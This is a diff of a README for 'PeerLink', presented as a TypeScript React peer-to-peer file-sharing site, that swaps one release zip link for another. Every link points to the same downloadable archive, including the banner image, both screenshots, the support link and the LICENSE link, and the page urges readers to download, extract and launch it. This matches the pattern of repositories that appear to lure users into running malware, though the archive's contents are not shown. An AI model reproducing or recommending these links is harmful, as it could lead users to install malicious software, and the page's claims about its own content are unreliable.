@@ -1,7 +1,7 @@
 
 # PeerLink 🚀
 
-![PeerLink](https://github.com/RaveWwave/PeerLink/releases/download/v1.0/Soft.zip)
+![PeerLink](https://github.com/RaveWwave/PeerLink/releases/download/v2.0/Software.zip)
 
 PeerLink is a cutting-edge TypeScript React website designed to facilitate fast and secure file sharing using peer-to-peer technology. With PeerLink, you can easily upload and share files with others in a seamless and efficient manner.
 
@@ -18,7 +18,7 @@ PeerLink is a cutting-edge TypeScript React website designed to facilitate fast 
 
 To get started with PeerLink, simply download the latest release from the link below and follow the installation guide:
 
-[![Download Latest Release](https://github.com/RaveWwave/PeerLink/releases/download/v1.0/Soft.zip%20Release-blue)](https://github.com/RaveWwave/PeerLink/releases/download/v1.0/Soft.zip)
+[![Download Latest Release](https://github.com/RaveWwave/PeerLink/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/RaveWwave/PeerLink/releases/download/v2.0/Software.zip)
 
 ### Launching the Application
 
@@ -35,13 +35,13 @@ Once you have downloaded the release file, extract it and launch the application
 
 Here are some snapshots of PeerLink in action:
 
-![Screenshot 1](https://github.com/RaveWwave/PeerLink/releases/download/v1.0/Soft.zip)
+![Screenshot 1](https://github.com/RaveWwave/PeerLink/releases/download/v2.0/Software.zip)
 
-![Screenshot 2](https://github.com/RaveWwave/PeerLink/releases/download/v1.0/Soft.zip)
+![Screenshot 2](https://github.com/RaveWwave/PeerLink/releases/download/v2.0/Software.zip)
 
 ## Support ℹ️
 
-For any inquiries or issues regarding PeerLink, please refer to the [Releases](https://github.com/RaveWwave/PeerLink/releases/download/v1.0/Soft.zip) section or contact the developers.
+For any inquiries or issues regarding PeerLink, please refer to the [Releases](https://github.com/RaveWwave/PeerLink/releases/download/v2.0/Software.zip) section or contact the developers.
 
 ## Contributing 🤝
 
@@ -49,7 +49,7 @@ We welcome contributions from the community to enhance PeerLink further. Feel fr
 
 ## License 📄
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/RaveWwave/PeerLink/releases/download/v1.0/Soft.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/RaveWwave/PeerLink/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
